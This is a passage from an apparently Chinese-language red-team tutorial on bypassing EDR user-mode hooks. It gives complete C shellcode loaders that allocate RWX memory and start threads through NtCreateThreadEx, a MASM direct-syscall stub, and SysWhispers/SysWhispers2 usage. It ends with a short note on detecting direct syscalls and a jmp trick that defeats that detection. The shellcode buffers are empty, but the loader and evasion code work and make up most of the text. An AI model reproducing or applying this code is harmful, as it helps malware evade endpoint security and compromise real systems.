    HANDLE pHandle = NULL;
    HANDLE tHandle = NULL;
    unsigned char shellcode[] = ""; // calc x64
    void* exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, 
PAGE_EXECUTE_READWRITE);
    memcpy(exec, shellcode, sizeof shellcode);
    HMODULE hModule = LoadLibrary(L"ntdll.dll");
    pHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());
    pfnNtCreateThreadEx NtCreateThreadEx = 
(pfnNtCreateThreadEx)GetProcAddress(hModule, "NtCreateThreadEx");
    NtCreateThreadEx(&tHandle, 0x1FFFFF, NULL, pHandle, exec, NULL, FALSE, 
NULL, NULL, NULL, NULL);
    Sleep(1000);
    CloseHandle(tHandle);
    CloseHandle(pHandle);
} 
可以看到，调⽤栈⾥没有出现 CreateThread() ：
3. 调⽤Syscall
现在已经去掉了 CreateThread() 的调⽤特征，但如果EDR对 ntdll.dll 也做了hook，我们就
需要利⽤Syscall来规避了。
在Visual Studio中⽣成⾃定义外部依赖，选择 masm ：
新建⼀个 syscall.asm ，属性的项类型选择 Microsoft Macro Assembler ，内容写⼊：
.code
NtCreateThreadEx proc
mov r10,rcx
mov eax,0C1h
syscall
ret
NtCreateThreadEx endp
end
这⾥的系统服务号需要根据⽬标系统⾃⾏修改，我的测试环境为 Win10 20H2 x64 .
其他部分代码，只需要稍微修改以下之前的即可：
#include 
#include 
EXTERN_C NTSTATUS NtCreateThreadEx
(
    OUT PHANDLE hThread,
    IN ACCESS_MASK DesiredAccess,
    IN PVOID ObjectAttributes,
    IN HANDLE ProcessHandle,
    IN PVOID lpStartAddress,
    IN PVOID lpParameter,
    IN ULONG Flags,
    IN SIZE_T StackZeroBits,
    IN SIZE_T SizeOfStackCommit,
    IN SIZE_T SizeOfStackReserve,
    OUT PVOID lpBytesBuffer
    );
int main()
{
    HANDLE pHandle = NULL;
    HANDLE tHandle = NULL;
    unsigned char shellcode[] = ""; // calc x64
    void* exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, 
PAGE_EXECUTE_READWRITE);
    memcpy(exec, shellcode, sizeof shellcode);
    HMODULE hModule = LoadLibrary(L"ntdll.dll");
    pHandle = GetCurrentProcess();
    NtCreateThreadEx(&tHandle, 0x1FFFFF, NULL, pHandle, exec, NULL, FALSE, 
NULL, NULL, NULL, NULL);
    Sleep(1000);
    CloseHandle(tHandle);
    CloseHandle(pHandle);
} 
效果如下：
这⾥在⽤户层已经没有了调⽤ ntdll!NtCreateThreadEx 的痕迹， U5 那⾥的 NtCreateThreadEx
只是因为⾃定义的函数也叫这个名字，更改⼀下即可：
三、利⽤⼯具
关于Syscall最有名的⼯具应该就是Syswhispers和SysWhispers2，分别来介绍⼀下。
Syswhispers 可以根据你要规避的函数⾃动⽣成头⽂件和 .asm ⽂件，并且还能适配系统版本：
# 导出所有函数，并且兼容所有⽀持版本的Windows
py .\syswhispers.py --preset all -o syscalls_all
# 仅仅导出常规函数，兼容Windows 7, 8, 10.
py .\syswhispers.py --preset common -o syscalls_common
# 导出NtProtectVirtualMemory和NtWriteVirtualMemory，兼容所有⽀持版本的Windows
py .\syswhispers.py --functions NtProtectVirtualMemory,NtWriteVirtualMemory -o 
syscalls_mem
# 导出所有兼容Windows 7, 8, 10的函数
py .\syswhispers.py --versions 7,8,10 -o syscalls_78X
继续以 NtCreateThreadEx 为例：
在项⽬中导⼊这两个作为头⽂件，在Visual Studio中⽣成⾃定义外部依赖，选择 masm ；属性
的项类型选择 Microsoft Macro Assembler ，代码示例：
#include 
#include 
#include "syscalls_78X.h"
int main()
{
    HANDLE pHandle = NULL;
    HANDLE tHandle = NULL;
    unsigned char shellcode[] = "";
    void* exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, 
PAGE_EXECUTE_READWRITE);
    memcpy(exec, shellcode, sizeof shellcode);
    HMODULE hModule = LoadLibrary(L"ntdll.dll");
    pHandle = GetCurrentProcess();
    NtCreateThreadEx(&tHandle, 0x1FFFFF, NULL, pHandle, exec, NULL, FALSE, 
NULL, NULL, NULL, NULL);
    Sleep(1000);
    CloseHandle(tHandle);
    CloseHandle(pHandle);
} 
效果和之前是⼀样的。
SysWhispers2 是 SysWhispers 的改进，相较后者，它使⽤了系统调⽤地址排序的⽅式来解决系
统调⽤号匹配的问题，具体步骤为：
 获取 ntdll.dll 的所有导出函数
 计算函数名的哈希，将其和对应的函数地址保存在 SW2_SYSCALL_ENTRY 结构体中
 按照函数地址，将⼀个 SW2_SYSCALL_ENTRY 从⼩到⼤排序
 需要调⽤某个函数时，计算出函数名的哈希，遍历对⽐ SW2_SYSCALL_ENTRY 获得数组序号，这
个序号就是系统调⽤号
⼀开始没能理解这样做的原理，后⾯经过@伍默以及@hl0rey的点拨，⽤IDA看了⼀下
ntdll.dll 的导出函数以及对应的系统调⽤号，发现：
所以按地址从⼩到⼤排序后，数组的下标就相当于系统调⽤号。这⾥的规则只适⽤于
ntdll.dll ，⽬前最新版本的Windows 10也还适⽤。
SysWhispers2 会⽣成3个⽂件，多了⼀个 .c ⽂件，⾥⾯是地址排序和根据哈希查找的实现，需
要导⼊到源代码部分。
四、检测与对抗
对于这种防御规避⼿段，也有研究者找到了相应的检测⽅法。
正常系统调⽤都是在 ntdll.dll 的地址范围内完成的，⽽使⽤直接syscall的⽅式是⾃⼰实现
ntdll 的相关导出函数，这样只要检测调⽤syscall的地址是否在 ntdll.dll 的地址范围内就可
以分辨哪些是正常系统调⽤，哪些是恶意软件。
研究者还给出了⼀个绕过上⾯检测的⽅法。EDR不能hook每个函数，所以可以先获取正常系
统调⽤的地址，再使⽤ jmp 指令跳转到正常系统调⽤处，以规避上⾯的检测⽅式，⽂章地址：
https://passthehashbrowns.github.io/hiding-your-syscalls
参考⽂章
https://www.anquanke.com/post/id/261582
https://blog.csdn.net/weixin_30480859/article/details/113370270
https://passthehashbrowns.github.io/detecting-direct-syscalls-with-frida
https://www.mdsec.co.uk/2020/12/bypassing-user-mode-hooks-and-direct-invocation-of-
system-calls-for-red-teams/
https://idiotc4t.com/defense-evasion/overwrite-winapi-bypassav